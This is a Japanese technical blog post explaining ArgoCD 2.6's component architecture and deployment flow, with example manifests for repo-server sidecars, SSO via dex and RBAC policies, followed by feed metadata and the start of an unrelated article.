application-controllerによるヘルスチェック(2) application-controllerによるマニフェスト差分検出(3) application-controllerによる処理結果保管(4) application-controllerによる処理結果取得(5) プロダクト用Cluster管理者のログイン(6) Ingressコントローラーによるルーティング(7) IDプロバイダーへの認証フェーズ委譲(8) IDプロバイダーによる認証フェーズ実施(9) argocd-serverによる認可フェーズ実施(10) application-controllerによるマニフェストデプロイ07. アーキテクチャのまとめ08. おわりに謝辞記事関連のおすすめ書籍01. はじめにロケットに乗るタコのツラが腹立つわー。画像引用元：Argo Projectさて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、全プロダクト共有のArgoCD\uD83D\uDC19とAWS EKSをリプレイスしました。今回は、採用した設計プラクティスの紹介も兼ねて、ArgoCDのマイクロサービスアーキテクチャと自動デプロイの仕組みを記事で解説しました。ArgoCDは、kubectlコマンドによるマニフェストのデプロイを自動化するツールです。ArgoCDのアーキテクチャには変遷があり、解説するのは執筆時点 (2023/05/02) で最新の 2.6 系のArgoCDです。アーキテクチャや仕組みはもちろん、個々のマニフェストの実装にもちょっとだけ言及します。それでは、もりもり布教していきます\uD83D\uDE1702. 概要アーキテクチャレイヤーまずは、ArgoCDのアーキテクチャのレイヤーがどのようになっているかを見ていきましょう。ArgoCD公式から、コンポーネント図が公開されています。図から、次のようなことがわかります\uD83D\uDC47下位レイヤー向きにしか依存方向がなく、例えばコアドメインとインフラのレイヤー間で依存性は逆転させていない。レイヤーの種類 (UI、アプリケーション、コアドメイン、インフラ) とそれらの依存方向から、レイヤードアーキテクチャのようなレイヤーに分けている。特にコアドメインレイヤーが独立したコンポーネントに分割されており、マイクロサービスアーキテクチャを採用している。argo-cd/docs/developer-guide/architecture/components.md at v2.8.0 \xb7 argoproj/argo-cd \xb7 GitHub▶ ArgoCDのマイクロサービスアーキテクチャの分割単位についてMonolith to Microservices: Evolutionary Patterns to Transform Your Monolith (English Edition)▶ ArgoCDのマイクロサービスアーキテクチャの設計図についてhttps://microsoft.github.io/code-with-engineering-playbook/design/diagram-types/DesignDiagramsTemplates/componentDiagrams/コンポーネント次に、コンポーネントの種類を紹介します。ArgoCDの各コンポーネントが組み合わさり、マニフェストの自動的なデプロイを実現します。ArgoCD (2.6系) のコンポーネントはいくつかあり、主要なコンポーネントの種類とレイヤーは以下の通りです\uD83D\uDC47 コンポーネント                       レイヤー              機能                                                                                                                                                                                                             argocd-server(argocd-apiserver)  UI・アプリケーション  みんながよく知るArgoCDのダッシュボードです。また、ArgoCDのAPIとしても機能します。現在、複数のレイヤーの責務を持っており、将来的にUIとアプリケーションは異なるコンポーネントに分割されるかもしれません。  application-controller               コアドメイン          Clusterにマニフェストをデプロイします。また、ArgoCD系カスタムリソースのカスタムコントローラーとしても機能します。                                                                                            repo-server                          コアドメイン          マニフェスト/チャートリポジトリからクローンを取得します。また、クローンからマニフェストを作成します。                                                                                                        redis-server                         インフラ              application-controllerの処理結果のキャッシュを保管します。                                                                                                                                                       dex-server                           インフラ              SSOを採用する場合、argocd-serverの代わりに認可リクエストを作成し、またIDプロバイダーに送信します。これにより、argocd-server上の認証フェーズをIDプロバイダーに委譲できます。                                 GitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux以降の図の凡例です。ArgoCDの各コンポーネント (application-controller、argocd-server、dex-server、repo-server) と各リソース (Application、AppProject) を区別しています。仕組みそれでは、ArgoCDは、どのようにコンポーネントを組み合わせて、マニフェストをデプロイするのでしょうか。ここではプロダクト用Cluster管理者 (デプロイ先となるClusterを管理するエンジニア) は、ArgoCDのダッシュボードを介してマニフェストをデプロイするとしましょう。まずは、概要を説明していきます。(1) repo-serverによるクローン取得ArgoCDのCluster上で、repo-serverがマニフェスト/チャートリポジトリのクローンを取得します。(2) application-controllerによるマニフェスト取得application-controllerは、repo-serverからマニフェストを取得します。(3) application-controllerによるCluster確認application-controllerは、プロダクト用Clusterの現状を確認します。(4) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。(5) argocd-serverによるキャッシュ取得argocd-serverは、redis-serverからキャッシュを取得します。(6) 管理者のログインプロダクト用Cluster管理者は、argocd-serverにログインしようとします。(7) IDプロバイダーへの認証フェーズ委譲argocd-serverは、ログイン時にIDプロバイダーに認証フェーズを委譲するために、dex-serverをコールします。▶ argocd-serverのログイン手法について(8) dex-serverによる認証リクエスト送信dex-serverは、IDプロバイダーに認可リクエストを作成し、これをIDプロバイダーに送信します。(9) argocd-serverによる認可フェーズ実行argocd-serverで認可フェーズを実施します。ログインが完了し、プロダクト用Cluster管理者は認可スコープに応じてダッシュボードを操作できます。▶ ArgoCDをどのClusterで管理するかについて(10) application-controllerによるマニフェストデプロイapplication-controllerは、Clusterにマニフェストをデプロイします。マニフェストのデプロイの仕組みをざっくり紹介しました。ただこれだと全く面白くないため、各コンポーネントの具体的な処理と、各々がどのように通信しているのかを説明します✌️03. repo-serverrepo-serverとはまずは、コアドメインレイヤーにあるrepo-serverです。マニフェスト/チャートリポジトリ (例：GiHub、GitHub Pages、Artifact Hub、AWS ECR、Artifact Registryなど) からクローンを取得します。repo-serverを持つPodには、他に軽量コンテナイメージからなるInitContainerとサイドカー (cmp-server) がおり、それぞれ機能が切り分けられています\uD83D\uDC4D仕組み(1) InitContainerによるお好きなツールインストール & argocd-cliバイナリコピーrepo-serverの起動時に、InitContainerでお好きなマニフェスト管理ツール (Helm、Kustomizeなど) やプラグイン (helm-secrets、KSOPS、SOPS、argocd-vault-pluginなど) をインストールします。また、サイドカーのcmp-serverでは起動時に/var/run/argocd/argocd-cmp-serverコマンドを実行する必要があり、InitContainer (ここではcopyutilコンテナ) を使用して、ArgoCDのコンテナイメージからargocd-cliのバイナリファイルをコピーします。repo-serverのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、ArgoCDで使いたいツール (Helm、SOPS、helm-secrets) をInitContainerでインストールしています。apiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: argocdspec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest  initContainers:    # HelmをインストールするInitContainer    - name: helm-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /custom-tools          name: custom-tools    # SOPSをインストールするInitContainer    - name: sops-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /custom-tools          name: custom-tools    # helm-secretsをインストールするInitContainer    - name: helm-secrets-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /helm-working-dir/plugins          name: helm-working-dir    ...    # cmp-serverにargocd-cliのバイナリをコピーするInitContainer    - name: copyutil      image: quay.io/argoproj/argocd:latest      command:        - cp        - -n        - /usr/local/bin/argocd        - /var/run/argocd/argocd-cmp-server      volumeMounts:        - name: var-files          mountPath: /var/run/argocd  # Podの共有ボリューム  volumes:    - name: custom-tools      emptyDir: {}    - name: var-files      emptyDir: {}Custom Tooling - Argo CD - Declarative GitOps CD for Kubernetes▶ ArgoCDのコンテナイメージに組み込まれているツールについてquay.io/argoproj/argocd) には、いくつかのツール (例：Helm、Kustomize、Ks、Jsonnetなど) の推奨バージョンがあらかじめインストールされています。そのため、これらのツールのプラグイン (例：helm-secrets) を使用する場合、上記のコンテナイメージからなるrepo-server内のツールをcmp-serverにコピーすればよいのでは、と思った方がいるかもしれません。この方法は全く問題なく、cmp-serverの/usr/local/binディレクトリ配下にツールをコピーするように、InitContainerを定義してもよいです。apiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: foospec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest      volumeMounts:        - mountPath: /usr/local/bin/helm          # Podの共有ボリュームを介して、repo-serverでHelmを使用する。          name: custom-tools  initContainers:    - name: copy-helm      image: quay.io/argoproj/argocd:latest      # InitContainer上のHelmをVolumeにコピーする      command:        - /bin/cp        - -n        - /usr/local/bin/helm        - /custom-tools/helm      volumeMounts:        - mountPath: /custom-tools          name: custom-tools  # 共有ボリューム  volumes:    - name: custom-tools      emptyDir: {}反対に、これらツールをInitContainerでインストールし直す場合は、ArgoCD上での推奨バージョンをちゃんとインストールするようにしましょう\uD83D\uDC4D2.6系では、ArgoCDのリポジトリ内のtool-versions.shファイルに、Helmのバージョンが定義されています。spec:  ...  initContainers:    - name: helm-installer      image: alpine:latest      command:        - /bin/sh        - -c      # ArgoCDのリポジトリ上のtool-versions.shファイルから、Helmのバージョンを取得する      args:        - |          apk --update add curl wget          ARGOCD_VERSION=$(curl -s https://raw.githubusercontent.com/argoproj/argo-helm/argo-cd-<ArgoCDのバージョン>/charts/argo-cd/Chart.yaml | grep appVersion | sed -e \'s/^[^: ]*: //\')          HELM_RECOMMENDED_VERSION=$(curl -s https://raw.githubusercontent.com/argoproj/argo-cd/\\"${ARGOCD_VERSION}\\"/hack/tool-versions.sh | grep helm3_version | sed -e \'s/^[^=]*=//\')          wget -q https://get.helm.sh/helm-v\\"${HELM_RECOMMENDED_VERSION}\\"-linux-amd64.tar.gz          tar -xvf helm-v\\"${HELM_RECOMMENDED_VERSION}\\"-linux-amd64.tar.gz          cp ./linux-amd64/helm /custom-tools/          chmod +x /custom-tools/helm      volumeMounts:        - mountPath: /custom-tools          name: custom-tools  ...argo-cd/hack/tool-versions.sh at v2.6.0 \xb7 argoproj/argo-cd \xb7 GitHub(2) repo-serverによる認証情報取得repo-serverは、Secret (argocd-repo-creds) からリポジトリの認証情報を取得します。argocd-repo-credsではリポジトリの認証情報のテンプレートを管理しています。指定した文字列から始まる (前方一致) URLを持つリポジトリに接続する場合、それらの接続で認証情報を一括して適用できます。argocd-repo-credsのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、リポジトリのSSH公開鍵認証を採用し、argocd-repo-credsに共通の秘密鍵を設定しています。apiVersion: v1kind: Secretmetadata:  name: argocd-repo-creds-github  namespace: argocd  labels:    argocd.argoproj.io/secret-type: repo-credstype: Opaquedata:  type: git  url: https://github.com/hiroki-hasegawa  # 秘密鍵  sshPrivateKey: |    MIIC2 ...あとは、各リポジトリのSecret (argocd-repo) にURLを設定しておきます。すると、先ほどのargocd-repo-credsのURLに前方一致するURLを持つSecretには、一括して秘密鍵が適用されます。# foo-repositoryをポーリングするためのargocd-repoapiVersion: v1kind: Secretmetadata:  namespace: argocd  name: foo-argocd-repo  labels:    argocd.argoproj.io/secret-type: repositorytype: Opaquedata:  # 認証情報は設定しない。  # チャートリポジトリ名  name: bar-repository  # https://github.com/hiroki-hasegawa に前方一致する。  url: https://github.com/hiroki-hasegawa/bar-chart.git---# baz-repositoryをポーリングするためのargocd-repoapiVersion: v1kind: Secretmetadata:  namespace: foo  name: baz-argocd-repo  labels:    argocd.argoproj.io/secret-type: repositorytype: Opaquedata:  # 認証情報は設定しない。  # チャートリポジトリ名  name: baz-repository  # https://github.com/hiroki-hasegawa に前方一致する。  url: https://github.com/hiroki-hasegawa/baz-chart.gitDeclarative Setup - Argo CD - Declarative GitOps CD for Kubernetes(3) repo-serverのよるクローン取得とポーリングrepo-serverは、認証情報を使用して、リポジトリにgit cloneコマンドを実行します。取得したクローンを、/tmp/_argocd-repoディレクトリ配下にUUIDの名前で保管します。また、リポジトリの変更をポーリングし、変更を検知した場合はgit fetchコマンドを実行します。# クローンが保管されていることを確認できる$ kubectl -it exec argocd-repo-server \\\\    -c repo-server \\\\    -n foo \\\\    -- bash -c \\"ls /tmp/_argocd-repo/<URLに基づくUUID>\\"# リポジトリ内のファイルChart.yaml  README.md  templates  values.yamlcustom repo-server - where is the local cache kept? \xb7 argoproj argo-cd \xb7 Discussion #9889 \xb7 GitHub▶ repo-serverでのクローン保管先のバージョン差異について2.3以前では、repo-serverは/tmpディレクトリ配下にURLに基づく名前でクローンを保管します。$ kubectl -it exec argocd-repo-server \\\\    -c repo-server \\\\    -n foo \\\\    -- bash -c \\"ls /tmp/https___github.com_hiroki-hasegawa_foo-repository\\"# リポジトリ内のファイルChart.yaml  README.md  templates  values.yaml(4) repo-serverによるサイドカーコールrepo-serverは、自身にマウントされたいくつかのマニフェスト管理ツール (例：Helm、Kustomize) を実行する機能を持っています。しかし、実行できないツールではサイドカー (cmp-server) をコールします。この時、Applicationの.spec.source.pluginキーでプラグイン名を指定すると、そのApplicationではサイドカーをコールします。逆を言えば、プラグイン名を指定していないApplicationは、サイドカーをコールしない です。apiVersion: argoproj.io/v1alpha1kind: Applicationmetadata:  name: foo-application  namespace: foospec:  source:    plugin:      name: helm-secrets # このプラグイン名は、ConfigManagementPluginのmetadata.nameキーに設定したもの  ...このコールは、Volume上のUnixドメインソケットを経由します。Unixドメインソケットのエンドポイントの実体は.sockファイルです。$ kubectl exec -it argocd-repo-server -c foo-plugin-cmp-server\\\\    -- bash -c \\"ls /home/argocd/cmp-server/plugins/\\"foo-plugin.sock▶ UnixソケットドメインについてASCII.jp：Unixドメインソケット (1/2)(5) repo-serverによる暗号化キーと暗号化変数の取得cmp-serverは、暗号化キー (例：AWS KMS、Google CKMなど) を使用してSecretストア (例：AWS SecretManager、Google SecretManager、SOPS、Vaultなど) の暗号化変数を復号化します。▶ クラウドプロバイダーの暗号化キーを使用するために必要な証明書について/etc/sslディレクトリ (ディレクトリはOSによって異なる) に証明書が無く、cmp-serverがHTTPSプロトコルを使用できない可能性があります。その場合は、お好きな方法で証明書をインストールし、コンテナにマウントするようにしてください\uD83D\uDC4DapiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: foospec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest  ...    # サイドカーのcmp-server    - name: helm-secrets-cmp-server      image: ubuntu:latest      ...      volumeMounts:        # サイドカーがAWS KMSを使用する時にHTTPSリクエストを送信する必要があるため、証明書をマウントする        - name: certificate          mountPath: /etc/ssl  ...  initContainers:    - name: certificate-installer      image: ubuntu:latest      command:        - /bin/sh        - -c      args:        - |          apt-get update -y          # ルート証明書をインストールする          apt-get install -y ca-certificates          # 証明書を更新する          update-ca-certificates      volumeMounts:        - mountPath: /etc/ssl          name: certificate  volumes:    - name: certificate      emptyDir: {}(6) サイドカーによるプラグイン処理の取得cmp-serverは、マニフェスト管理ツールのプラグイン (helm-secrets、argocd-vault-pluginなど) を実行します。この時マニフェストの作成時のプラグインとして、ConfigMap配下のConfigManagementPluginでプラグインの処理を定義します。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、プラグインとしてhelm-secretsを採用し、helm secrets templateコマンドの実行を定義します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmp-cm  namespace: foodata:  helm-secrets-plugin.yaml: |    apiVersion: argoproj.io/v1alpha1    kind: ConfigManagementPlugin    metadata:      namespace: foo      name: helm-secrets # このプラグイン名は、Applicationのspec.source.pluginキーで指定したもの    spec:      generate:        command:          - /bin/bash          - -c        args:          - |            set -o pipefail            helm secrets template -f $ARGOCD_ENV_SECRETS -f $ARGOCD_ENV_VALUES -n $ARGOCD_APP_NAMESPACE $ARGOCD_APP_NAME .  foo-plugin.yaml: |    ...▶ ConfigManagementPluginのファイル名について(7) サイドカーによるプラグイン処理の実行cmp-serverはプラグインを実行し、Secretを含むマニフェストを作成します。ConfigMap配下のファイルをplugin.yamlの名前でサイドカーにマウントする必要があります。また、先ほどのUnixドメインソケットの.sockファイルや、 cmp-serverがプラグインを実行するための各バイナリファイルもマウントが必要です。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、helm-secretsプラグインを実行するサイドカー (helm-secrets-cmp-server) を作成します。apiVersion: v1kind: Podmetadata:  name: argocd-repo-serverspec:  containers:    # repo-server    - name: repo-server      image: quay.io/argoproj/argocd:latest    ...    # helm-secretsのcmp-server    - name: helm-secrets-cmp-server      # コンテナイメージは軽量にする      image: ubuntu:latest      command:        - /var/run/argocd/argocd-cmp-server      env:        # helmプラグインの場所を設定する        - name: HELM_PLUGINS          value: /helm-working-dir/plugins      securityContext:        runAsNonRoot: true        runAsUser: 999      volumeMounts:        # リポジトリのクローンをコンテナにマウントする        - name: tmp          mountPath: /tmp        # ConfigManagementPluginのマニフェスト (helm-secrets.yaml) を \\"plugin.yaml\\" の名前でコンテナにマウントする        - name: argocd-cmp-cm          mountPath: /home/argocd/cmp-server/config/plugin.yaml          subPath: helm-secrets.yaml        # コンテナ間で通信するためのUnixドメインソケットファイルをコンテナにマウントする        - name: plugins          mountPath: /home/argocd/cmp-server/plugins        # 任意のツールのバイナリファイルをコンテナにマウントする        - name: custom-tools          mountPath: /usr/local/bin        # helmプラグインのバイナリをコンテナにマウントする        - name: helm-working-dir          mountPath: /helm-working-dir/plugins      ...  # Podの共有ボリューム  volumes:    # リポジトリのクローンを含む    - name: tmp      emptyDir: {}    # Helmなどの任意のツールを含む    - name: custom-tools      emptyDir: {}    # helmプラグインを含む    - name: helm-working-dir      emptyDir: {}▶ マウント時のConfigManagementPluginのファイル名についてv2.6では、ConfigManagementPluginのマニフェストを/home/argocd/cmp-server/configディレクトリに、plugin.yamlの名前でマウントしないといけません。これは、cmp-serverの起動コマンド (/var/run/argocd/argocd-cmp-server) がplugin.yamlの名前しか扱えないためです。ArgoCD公式の見解で、サイドカーでは単一のプラグインしか実行できないように設計しているとのコメントがありました。今後のアップグレードで改善される可能性がありますが、v2.6では、ConfigManagementPluginの数だけcmp-serverが必要になってしまいます\uD83D\uDE47\uD83C\uDFFB‍use multiple plugins in sidecar installation method \xb7 argoproj argo-cd \xb7 Discussion #12278 \xb7 GitHub▶ Kustomizeのプラグインをどのコンテナで実行するかについて▶ クラウドプロバイダーのSecretストアを採用する場合についてHow to Manage Kubernetes Secrets with GitOps for Secure Deployments - Akuity Blog04. application-controller、redis-serverapplication-controllerとはコアドメインレイヤーにあるapplication-controllerです。Clusterにマニフェストをデプロイします。また、ArgoCD系カスタムリソースのカスタムコントローラーとしても機能します。redis-serverとはインフラレイヤーにあるredis-serverです。application-controllerの処理結果のキャッシュを保管します。仕組み(1) ArgoCD用Cluster管理者のkubectl applyコマンドArgoCD用Clusterの管理者は、ClusterにArgoCD系のカスタムリソース (例：Application、AppProjectなど)　をデプロイします。▶ ArgoCD自体のデプロイにargo-helmを採用する場合についてGitHub - argoproj/argo-helm: ArgoProj Helm ChartsただしHelmの重要な仕様として、チャートの更新時に使用するhelm upgradeコマンドは、CRDを作成できる一方でこれを変更できません。HelmでCRDを作成するとHelmの管理ラベルが挿入されてしまうため、作成の時点からCRDがHelmの管理外となるように、kubectlコマンドでCRDを作成した方がよいです\uD83D\uDC4D$ kubectl diff -k \\"https://github.com/argoproj/argo-cd/manifests/crds?ref=<バージョンタグ>\\"$ kubectl apply -k \\"https://github.com/argoproj/argo-cd/manifests/crds?ref=<バージョンタグ>\\"ArgoCD上でHelmを使用してデプロイする場合はこの仕様を気にしなくてよいのかな、と思った方がいるかもしれないです。ですが本記事で解説した通り、ArgoCDはcmp-serverのhelm templateコマンド (この時、--include-crdsオプションが有効になっている) や、application-controllerのkubectl applyコマンドを組み合わせてマニフェストをデプロイしているため、CRDもちゃんと更新してくれます\uD83D\uDC4D\uD83C\uDFFB️Helm | Custom Resource Definitions(2) application-controllerによるArgoCD系カスタムリソースのReconciliationkube-controller-managerは、application-controllerを操作し、Reconciliationを実施します。application-controllerは、Etcd上に永続化されたマニフェストと同じ状態のArgoCD系カスタムリソースを作成/変更します。▶ カスタムコントローラーでもあるapplication-controllerについてHow Operators work in Kubernetes | Red Hat Developer(3) application-controllerによるマニフェスト取得application-controllerは、repo-serverからリポジトリのマニフェストを取得します。取得したマニフェストは、repo-serverのサイドカーであるcmp-serverが作成したものです。(4) application-controllerによるヘルスチェックapplication-controllerは、プロダクト用Clusterをヘルスチェックします。application-controllerには、gitops-engineパッケージが内蔵されており、これはヘルスチェックからデプロイまでの基本的な処理を実行します。▶ gitops-engineパッケージについてv0.7.0 では以下のディレクトリからなります\uD83D\uDC47\uD83D\uDC31 gitops-engine/├── \uD83D\uDCC2 pkg│    ├── cache│    ├── diff   # リポジトリとClusterの間のマニフェストの差分を検出する。ArgoCDのDiff機能に相当する。│    ├── engine # 他のパッケージを使い、GitOpsの一連の処理を実行する。│    ├── health # Clusterのステータスをチェックする。ArgoCDのヘルスチェック機能に相当する。│    ├── sync   # Clusterにマニフェストをデプロイする。ArgoCDのSync機能に相当する。│    └── utils  # 他のパッケージに汎用的な関数を提供する。│...gitops-engine/specs/design-top-down.md at v0.7.0 \xb7 argoproj/gitops-engine \xb7 GitHub(5) application-controllerによるマニフェスト差分検出application-controllerは、プロダクト用Clusterのマニフェストと、repo-serverから取得したマニフェストの差分を検出します。ここで、kubectl diffコマンドの実行が自動化されています。(6) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。redis-serverは、Applicationやリポジトリのコミットの単位で、application-controllerの処理結果を保管しています。$ kubectl exec -it argocd-redis-server \\\\    -n foo \\\\    -- sh -c \\"redis-cli --raw\\"127.0.0.1:6379> keys *...app|resources-tree|<Application名>|<キャッシュバージョン>cluster|info|<プロダクト用ClusterのURL>|<キャッシュバージョン>git-refs|<マニフェスト/チャートリポジトリのURL>|<キャッシュバージョン>mfst|app.kubernetes.io/instance|<Application名>|<最新のコミットハッシュ値>|<デプロイ先Namespace>|*****|<キャッシュバージョン>...(7) application-controllerによるマニフェストデプロイapplication-controllerは、Applicationの操作に応じて、Clusterにマニフェストをデプロイします。ここで、kubectl applyコマンドの実行が自動化されています。▶ application-controllerがマニフェストを操作した証拠についてmetadata.managedFieldsキーがあり、何がそのマニフェストを作成/変更したのかを確認できます。実際にマニフェストを確認してみると、確かにapplication-controllerがマニフェストを作成/変更してくれたことを確認できます。apiVersion: apps/v1kind: Deploymentmetadata:  managedFields:    # ArgoCDのapplication-controllerによる管理    - manager: argocd-application-controller      apiVersion: apps/v1      # kube-apiserverに対するリクエスト内容      operation: Update      time: \\"2022-01-01T16:00:00.000Z\\"      # ArgoCDのapplication-controllerが管理するマニフェストのキー部分      fields: ...️Server-Side Apply | Kubernetes05. dex-serverdex-serverとはインフラレイヤーにあるdex-serverです。SSO (例：OAuth 2.0、SAML、OIDC) を採用する場合、argocd-serverの代わりに認可リクエストを作成し、またIDプロバイダー (例：GitHub、Keycloak、AWS Cognito、Google Authなど) に送信します。これにより、argocd-server上の認証フェーズをIDプロバイダーに委譲できます。GitHub - dexidp/dex: OpenID Connect (OIDC) identity and OAuth 2.0 provider with pluggable connectors▶ dex-serverの必要性について2.0、SAML) を使用する場合は、dex-serverを採用する必要があります\uD83D\uDC4D️Overview - Argo CD - Declarative GitOps CD for Kubernetes仕組み(1) プロダクト用Cluster管理者のログインプロダクト用Cluster管理者がダッシュボード (argocd-server) にSSOを使用してログインしようとします。(2) IDプロバイダーへの認証フェーズ委譲argocd-serverは、認証フェーズをIDプロバイダーに委譲するために、dex-serverをコールします。▶ 認証フェーズの委譲についてAuthentication and Authorization - Argo CD - Declarative GitOps CD for Kubernetes(3) dex-serverによる認可リクエスト作成dex-serverは、認可リクエストを作成します。認可リクエストに必要な情報は、ConfigMap (argocd-cm) で設定しておく必要があります。argocd-cmのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、IDプロバイダーをGitHubとし、認可リクエストに必要なクライアントIDとクライアントシークレットを設定しています。apiVersion: v1kind: ConfigMapmetadata:  namespace: foo  name: argocd-cmdata:  dex.config: |    connectors:      - type: github        id: github        name: GitHub SSO        config:          clientID: *****          clientSecret: *****        # dex-serverが認可レスポンスによるリダイレクトを受信するURLを設定する        redirectURI: https://example.com/api/dex/callback▶ dex-serverの設定についてdex.configキー配下の設定方法は、dexのドキュメントをみるとよいです\uD83D\uDC4DAuthentication Through GitHub |(4) dex-serverによる認可リクエスト送信dex-serverは、前の手順で作成した認可リクエストをIDプロバイダーに送信します。(5) IDプロバイダーによる認証フェーズ実施IDプロバイダー側でSSOの認証フェーズを実施します。IDプロバイダーは、コールバックURL (<ArgoCDのドメイン名>/api/dex/callback) を指定して、認可レスポンスを送信します。認可レスポンスはリダイレクトを発生させ、argocd-serverを介して、再びdex-serverに届きます。この後、dex-serverはIDプロバイダーのトークンエンドポイントにリクエストを送信し、またIDプロバイダーからトークン (アクセストークン、IDトークンなど) やユーザー情報を取得します。ただ、SSOの種類によって仕組みが異なるため、詳細は省略します。▶ dex-serverのコールバックURLについてDeveloper settingsタブ でSSOを設定する必要があり、この時にAuthorization callback URLという設定箇所があるはずです\uD83D\uDC4D\uD83C\uDFFB(6) argocd-serverによる認可フェーズ実施argocd-serverは、AuthZで認可フェーズを実施します。ConfigMap (argocd-rbac-cm) を参照し、IDプロバイダーから取得したユーザーやグループに、ArgoCD系カスタムリソースに関する認可スコープを付与します。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、developerロールにはdevというAppProjectに属するArgoCD系カスタムリソースにのみ、またmaintainerロールには全てのAppProjectの操作を許可しています。またこれらのロールを、IDプロバイダーで認証されたグループに紐づけています。特定のArgoCD系カスタムリソースのみへのアクセスを許可すれば、結果として特定のClusterへのデプロイのみを許可したことになります\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: foodata:  # デフォルトのロール  policy.default: role:developer  policy.csv: |    p, role:developer, *, *, dev/*/*, allow    p, role:maintainer, *, *, dev/*/*, allow    p, role:maintainer, *, *, prd/*/*, allow    g, developers, role:developer    g, maintainers, role:maintainer  scopes: \\"[groups]\\"▶ AppProjectの認可定義の記法についてCasbin の記法を使用します。今回の実装例で使用したp (パーミッション) とg (グループ) では、以下を記法を使用できます\uD83D\uDC4DapiVersion: v1kind: ConfigMapmetadata:  name: argocd-rbac-cm  namespace: argocddata:  policy.default: role:readonly  policy.csv: |    # ロールとArgoCD系カスタムリソースの認可スコープを定義する    p, role:<ロール名>, <Kubernetesリソースの種類>, <アクション名>, <AppProject名>/<ApplicationのNamespace名>/<Application名>, <許否>    # 認証済みグループにロールを紐付ける    g, <グループ名>, role:<ロール名>  scopes: \\"[groups]\\"RBAC Configuration - Argo CD - Declarative GitOps CD for Kubernetes06. argocd-server (argocd-apiserver)argocd-serverとは最後に、インフラレイヤーにあるargocd-serverです。『argocd-apiserver』とも呼ばれます。みんながよく知るArgoCDのダッシュボードです。また、ArgoCDのAPIとしても機能し、他のコンポーネントと通信します\uD83E\uDD84仕組み(1) application-controllerによるヘルスチェックapplication-controllerは、プロダクト用Clusterをヘルスチェックします。(2) application-controllerによるマニフェスト差分検出application-controllerは、プロダクト用Clusterのマニフェストと、ポーリング対象のリポジトリのマニフェストの差分を検出します。(3) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。(4) application-controllerによる処理結果取得argocd-serverは、redis-serverから処理結果を取得します。(5) プロダクト用Cluster管理者のログインプロダクト用Cluster管理者がダッシュボード (argocd-server) にSSOを使用してログインしようとします。(6) IngressコントローラーによるルーティングIngressコントローラーは、Ingressのルーティングルールを参照し、argocd-serverにルーティングします。(7) IDプロバイダーへの認証フェーズ委譲argocd-serverは、ログイン時にIDプロバイダーに認証フェーズを委譲するために、dex-serverをコールします。(8) IDプロバイダーによる認証フェーズ実施IDプロバイダー上で認証フェーズが完了します。argocd-serverは、ConfigMap (argocd-rbac-cm) を参照し、プロダクト用Cluster管理者に認可スコープを付与します。(9) argocd-serverによる認可フェーズ実施argocd-serverは、認可スコープに応じて、プロダクト用Cluster管理者がApplicationを操作可能にします。▶ NamespacedスコープモードについてapiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmd-params-cm  namespace: foodata:  # 設定してはダメ  # application.namespaces: \\"*\\" # 全てのNamespaceを許可する。apiVersion: argoproj.io/v1alpha1kind: AppProjectmetadata:  name: dev-foo-project  namespace: foospec:  # 設定してはダメ  # sourceNamespaces:  #  - \\"foo\\"これらにより、fooのNamespaceに属するArgoCDは、他のNamespaceにはアクセスできなくなります\uD83D\uDC4DInstallation - Argo CD - Declarative GitOps CD for Kubernetes(10) application-controllerによるマニフェストデプロイプロダクト用Cluster管理者は、ダッシュボード (argocd-server) を使用して、ClusterにマニフェストをSyncします。この時、Applicationを介してapplication-controllerを操作し、マニフェストをデプロイします。図では、App Of Appsパターンを採用したと仮定しています\uD83D\uDC68‍\uD83D\uDC69‍\uD83D\uDC67‍\uD83D\uDC66▶ App Of Appsパターンについて07. アーキテクチャのまとめ今までの全ての情報をざっくり整理して簡略化すると、ArgoCDは以下の仕組みでマニフェストをデプロイすることになります\uD83D\uDC4708. おわりにArgoCDによるデプロイの仕組みの仕組みをもりもり布教しました。ArgoCDは、UIが使いやすく、仕組みの詳細を知らずとも比較的簡単に運用できるため、ユーザーフレンドリーなツールだと思っています。もしArgoCDを使わずにマニフェストをデプロイしている方は、ArgoCDの採用をハイパー・ウルトラ・アルティメットおすすめします\uD83D\uDC4D謝辞ArgoCDの設計にあたり、以下の方に有益なプラクティスをご教授いただきました。@yaml_villager さんこの場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍GitOps Cookbook: Kubernetes Automation in Practice (English Edition)作者:Vinto, Natale,Bueno, Alex SotoO\'Reilly MediaAmazonGitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux作者:Yuen, Billy,Matyushentsev, Alexander,Ekenstam, Todd,Suen, JesseManning PublicationsAmazon","isoDate":"2023-05-02T05:42:57.000Z","dateMiliSeconds":1683006177000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"現代のクエリオプティマイザの基礎となる技術をまとめた論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/15_query_optimization_overview","contentSnippet":"この記事の趣旨1998年に発表されたクエリオプティマイザの基礎としてとくに重要な手法をまとめた論文を読みました。An Overview of Query Optimization in Relational Systems著者についてSurajit 